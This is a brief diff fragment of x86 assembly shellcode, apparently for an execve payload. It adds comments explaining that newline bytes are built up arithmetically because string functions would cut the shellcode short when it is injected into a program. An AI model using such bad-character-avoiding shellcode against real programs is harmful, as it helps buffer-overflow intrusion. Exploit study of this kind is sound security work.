@@ -19,6 +19,8 @@
 	movl	%eax,(ENVP)(%esi)	/* set up null envp */
 
 	/* there are 10s and new line characters at the low address space of  %al*/
+	/* shellcode with these chars cannot be injected into programs because  */
+	/* string functions will terminate on them.  We need to fill these bytes up */
 
     add     $5, %al         	/* add 5 low bytes */
     add     $5, %al         	/* add 5 low bytes */
